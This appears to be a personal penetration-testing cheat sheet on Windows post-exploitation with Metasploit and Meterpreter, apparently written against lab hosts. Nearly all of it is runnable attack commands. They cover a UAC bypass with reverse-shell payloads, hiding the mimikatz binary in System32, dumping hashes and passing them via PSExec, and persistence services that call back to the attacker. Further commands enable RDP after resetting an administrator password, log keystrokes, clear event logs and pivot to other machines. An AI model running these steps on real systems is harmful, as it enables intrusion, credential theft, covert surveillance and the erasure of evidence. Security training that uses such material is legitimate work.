*Results of these commands are stored in `loot`*
## Common post exploitation modules
- Change meterpreter architecture
	```
	use post/windows/manage/archmigrate
	```
- Privilege enumeration
	```
	post/windows/gather/win_privs
	```
- Logged on users
	```
	post/windows/gather/enum_logged_on_users
	```
- Virtual environment detection
	```
	post/windows/gather/checkvm
	```
- Installed applications
	```
	post/windows/gather/enum_applications
	```
- AV detection
	```
	post/windows/gather/enum_av_excluded
	```
- Enumerate computers in the same domain
	```
	post/windows/gather/enum_computers
	```
- Check applied patches
	```
	post/windows/gather/enum_patches
	or open a shell and run `systeminfo`
	```
- Check shares
	```
	post/windows/gather/enum_shares
	```
- Enable RDP on target
	```
	post/windows/manage/enable_rdp
	```

## UAC Bypass
- By injecting a trusted publisher certificate through process injection in the memory
- Get a meterpreter shell and then use the UAC bypass module
	```
	exploit/windows/local/bypassuac_injection
	```
- Example
	```
	setg rhosts 10.3.22.68
	run
	sysinfo
	search bypassuac
	use exploit/windows/local/bypassuac_injection
	show options 
	set session 1
	set target Windows\ x64 
	set payload windows/x64/meterpreter/reverse_tcp
	run
	sysinfo
	getuid
	getsystem 
	getuid
	```


## Token Impersonation
- Can be done with the metaspoloit module ![[Modules#Incognito Module]]
## Dumping Hashes w/ Kiwi Extension
- ![[Modules#Kiwi Module]]
- You can upload the mimikatz binary on the Windows target machine:
	```
	upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
	<upload it in `System32` so that it can't be found>
	```
	
## Pass The Hash With PSExec
- Utlizing the captured hashes to elevate privileges
- First get the hashes with `post/windows/gather/hashdump`. Result would be like
	```
		Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
	bob:1008:aad3b435b51404eeaad3b435b51404ee:31b977436c6ea5bfa9ee65aaddb880d1:::
	```
- Use the two values after 500 i.e. `aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20` for #tools/multi/msfconsole #tools/exploit/psexec_py 
- Use `5c4d59391f656d5958dab124ffeabc20` with #tools/exploit/multi/crackmapexec 
## Establishing Persistence
- Making sure we always have a connection with the target machine even if it restarts or is shut down for a really long time
- Modules
	```
	search platform:windows persistence
	```
- Create a service
	```
	exploit/windows/local/persistence_service
	```
- Start a listener on the same port used for above and you will get a reverse shell automatically with `multi/handler` for the same port and payload used with `persistence_service` (`windows/meterpreter/reverse_tcp`)
	```
	use exploit/windows/http/rejetto_hfs_exec 
	setg rhosts 10.3.18.170
	run
	sysinfo
	getuid
	getsystem 
	getuid
	use exploit/windows/local/persistence_service 
	show options 
	set session 1
	set lhost eth1
	set payload windows/x64/meterpreter/reverse_tcp
	run
	set payload windows/meterpreter/reverse_tcp
	run
	sessions 
	run
	getuid
	use exploit/multi/handler 
	sessions -K
	use multi/handler
	show options 
	set lhost eth1
	run
	msf6 
	```

## Enabling RDP
- You need `NT AUTHORITY\SYSTEM` session on meterpreter for this (or maybe not)
- Use the module 
	```
	post/windows/manage/enable_rdp
	```
	- Provide the session number and not username and password
- Go back to your meterpreter session and change the password for one of the accounts with the command:
	```
	> net user administrator <password>
	```
- Then use #tools/utility/xfreerdp to connect via RDP

## Keylogging
- Simply create a meterpreter session
- Migrate to `$(pgrep explorer)`
- Run the command:
	```
	keyscan_start # start the keylogger
	keyscan_dump # dump whatever have been typed up till now
	```

## Clearing Logs
- Categorized based on types of events
	- Application logs
	- System logs
	- Security logs
- To do so, just get a meterpreter session
- Do your stuff and run the commands from meterpreter session
	```
	> clearev
	```

## Pivoting
- Utilizing compromized host to move to other machines
### Steps
- 3 machines: 10.3.28.70 (accessible to attacker); 10.3.24.202 (accessible to 10.3.28.70)
- Gain access to the initial machine:
	```
	> use exploit/windows/http/rejetto_hfs_exec
	> set rhosts 10.3.28.70
	> run
	```
- Add a route, so that you can run commands that can go through this machine
	```
	meterpreter> sysinfo
	meterpreter> getuid
	meterpreter> ipconfig
	meterpreter> run autoroute -s 10.3.28.0/20 # subnet info from ipconfig
	```
- Run a scan against the other machine with the portscan module
	```
	search portscan
	use auxiliary/scanner/portscan/tcp
	set rhosts 10.3.24.202
	set ports 1-100
	run
	```
- Now you know which ports are open on the other target machine. So, the next task is to scan them. For this you create a port forwarding on the machine to which you have access in such a way that the traffic is forwarded from a port on attackers machine which is sent via this machine to the other target machine
	```
	sessions 1
	meterpreter> portfwd add -l 1234 -p 80 -r 10.3.24.202 # 1234 on attackers machine and 80 on the 24.202 machine
	```
- Run an nmap scan against your local port as it gets sent to the other machine
	```
	db_nmap -sV -p1234 localhost
	```
- Exploit it. Set the actual target IP as autoroute will handle that and make sure to change the payload to `bind_tcp` because you can't get a reverse tcp on your local machine in this case as there is no direct connectivity
	```
	use exploit/windows/http/badblue_passthru
	set rhosts 10.3.24.202
	set lport 4433
	set payload windows/meterpreter/bind_tcp
	run
```